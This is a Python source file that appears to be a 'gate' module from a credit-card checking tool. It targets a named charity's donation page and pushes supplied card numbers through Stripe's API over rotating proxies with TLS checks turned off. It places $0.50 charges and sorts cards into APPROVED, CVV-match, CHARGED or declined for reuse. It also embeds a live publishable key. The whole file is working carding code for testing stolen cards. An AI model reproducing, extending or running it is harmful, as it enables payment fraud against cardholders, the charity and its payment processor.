"""
Cedine Ministries AUTH Gate - REAL BANK AUTHORIZATION via Payment Intent
Step 1: Create Payment Method
Step 2: Create Payment Intent with $0.50 charge
Step 3: Confirm intent = Real bank authorization request
Site: https://cedine.org/donate/
"""

import os
import requests
import random
from typing import Tuple
from faker import Faker
from gates.error_types import GatewayErrorType, error_type_from_response


# Load Stripe keys from environment (safer than hardcoding)
STRIPE_PK = os.getenv('STRIPE_PK', 'pk_live_51Il6lyCfjeYBwRLXQZN9sTTvSqsF9Zh5Gq83z9mJhzpTVYVJRQM2Y0OAOSeCfG86j9sDBkWuLdQ71xPBp4A1MdQN00jO6gJu8D')
STRIPE_SK = os.getenv('STRIPE_SK', '')  # Must be set in .env file


def cedine_auth_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                      proxy: dict = None) -> Tuple[str, bool]:
    """
    Cedine AUTH check via Stripe Payment Intent - REAL BANK AUTHORIZATION
    
    Flow:
    1. Create Payment Method with card details
    2. Create Payment Intent with $0.50 charge
    3. Auto-confirm intent (hits bank for authorization)
    4. Parse real bank response codes
    
    Returns:
        Tuple of (status_message, proxy_alive)
    """
    fake = Faker()
    
    if len(card_yer) == 2:
        card_yer = "20" + card_yer
    
    try:
        session = requests.Session()
        session.verify = False
        
        if proxy:
            if isinstance(proxy, dict):
                session.proxies = proxy
            elif isinstance(proxy, str):
                parts = proxy.split(':')
                if len(parts) == 4:
                    proxy_url = f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
                elif len(parts) == 2:
                    proxy_url = f'http://{parts[0]}:{parts[1]}'
                else:
                    proxy_url = proxy
                session.proxies = {'http': proxy_url, 'https': proxy_url}
        
        guid = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04x}-4{random.randint(100, 999):03x}-{random.randint(8000, 9999):04x}-{random.randint(100000000000, 999999999999):012x}"
        
        # Step 1: Create Payment Method SERVER-SIDE with Secret Key (more secure)
        headers_pm = {
            'Authorization': f'Bearer {STRIPE_SK}',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        
        data_pm = {
            'type': 'card',
            'card[number]': card_num,
            'card[exp_month]': card_mon,
            'card[exp_year]': card_yer,
            'card[cvc]': card_cvc,
        }
        
        response_pm = session.post('https://api.stripe.com/v1/payment_methods',
                                   headers=headers_pm, data=data_pm, timeout=25)
        result_pm = response_pm.json()
        
        # Handle Payment Method errors (invalid card format, expired, etc.)
        if 'error' in result_pm:
            error_msg = result_pm['error'].get('message', 'Unknown error')
            error_code = result_pm['error'].get('code', '')
            
            if 'test' in error_msg.lower():
                return ("DECLINED ❌ - Live Mode Test Card", True)
            if error_code in ['incorrect_cvc', 'invalid_cvc']:
                return ("CVV ❌ - Incorrect CVV (card format may be valid)", True)
            if error_code == 'expired_card':
                return ("DECLINED ❌ - Expired Card", True)
            if error_code == 'invalid_number' or 'number' in error_msg.lower():
                return ("DECLINED ❌ - Invalid Card Number", True)
            
            return (f"DECLINED ❌ - {error_msg[:50]}", True)
        
        pm_id = result_pm.get('id')
        if not pm_id:
            return ("Error: Failed to create payment method", True)
        
        card_brand = result_pm.get('card', {}).get('brand', 'unknown').upper()
        last4 = result_pm.get('card', {}).get('last4', 'xxxx')
        
        # Step 2 & 3: Create and Confirm Payment Intent (REAL BANK HIT)
        headers_pi = {
            'Authorization': f'Bearer {STRIPE_SK}',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        
        data_pi = {
            'amount': '50',  # $0.50 in cents (minimum for real auth)
            'currency': 'usd',
            'payment_method': pm_id,
            'confirm': 'true',  # Auto-confirm = immediate bank authorization
            'description': 'Card Verification - Cedine',
            'statement_descriptor': 'VERIFY',
        }
        
        response_pi = session.post('https://api.stripe.com/v1/payment_intents',
                                  headers=headers_pi, data=data_pi, timeout=30)
        result_pi = response_pi.json()
        
        # Step 4: Parse Payment Intent response (REAL BANK RESPONSE)
        if 'error' in result_pi:
            error_msg = result_pi['error'].get('message', 'Unknown error')
            error_code = result_pi['error'].get('code', '')
            decline_code = result_pi['error'].get('decline_code', '')
            
            # Real bank decline codes
            if decline_code == 'insufficient_funds':
                return (f"APPROVED ✅ - {card_brand} *{last4} CVV Match - Insufficient Funds (Valid Card!)", True)
            elif decline_code == 'lost_card':
                return (f"DECLINED ❌ - {card_brand} *{last4} Lost Card (Bank Flagged)", True)
            elif decline_code == 'stolen_card':
                return (f"DECLINED ❌ - {card_brand} *{last4} Stolen Card (Bank Flagged)", True)
            elif decline_code == 'do_not_honor':
                return (f"DECLINED ❌ - {card_brand} *{last4} Do Not Honor", True)
            elif decline_code == 'fraudulent':
                return (f"DECLINED ❌ - {card_brand} *{last4} Fraud Detected", True)
            elif decline_code in ['generic_decline', 'card_declined']:
                return (f"DECLINED ❌ - {card_brand} *{last4} Generic Decline", True)
            elif error_code == 'incorrect_cvc':
                return (f"CVV ❌ - {card_brand} *{last4} Incorrect CVV (Bank Verified!)", True)
            elif error_code == 'expired_card' or decline_code == 'expired_card':
                return (f"DECLINED ❌ - {card_brand} *{last4} Expired Card", True)
            elif error_code == 'card_declined':
                return (f"DECLINED ❌ - {card_brand} *{last4} {decline_code or 'Declined by Bank'}", True)
            else:
                return (f"DECLINED ❌ - {card_brand} *{last4} {decline_code or error_msg[:30]}", True)
        
        # Check payment status
        status = result_pi.get('status')
        if status == 'succeeded':
            return (f"CHARGED ✅ - {card_brand} *{last4} $0.50 Authorized & Captured! (CVV Match)", True)
        elif status == 'requires_payment_method':
            last_error = result_pi.get('last_payment_error', {})
            decline_code = last_error.get('decline_code', '')
            
            if decline_code == 'insufficient_funds':
                return (f"APPROVED ✅ - {card_brand} *{last4} CVV Match - Insufficient Funds", True)
            elif decline_code:
                return (f"DECLINED ❌ - {card_brand} *{last4} {decline_code}", True)
            else:
                return (f"DECLINED ❌ - {card_brand} *{last4} Requires New Payment Method", True)
        elif status == 'requires_action':
            return (f"APPROVED ✅ - {card_brand} *{last4} 3DS Required (Card Valid!)", True)
        elif status == 'processing':
            return (f"PROCESSING ⏳ - {card_brand} *{last4} Payment Processing", True)
        else:
            return (f"UNKNOWN ⚠️ - {card_brand} *{last4} Status: {status}", True)
        
    except requests.exceptions.Timeout:
        return ("Error: Request timeout", False)
    except requests.exceptions.RequestException:
        return ("Error: Network issue", False)
    except Exception as e:
        return (f"Error: {str(e)[:40]}", False)


if __name__ == "__main__":
    result, alive = cedine_auth_check("4000000000000002", "12", "29", "123")
    print(f"Result: {result}, Proxy OK: {alive}")
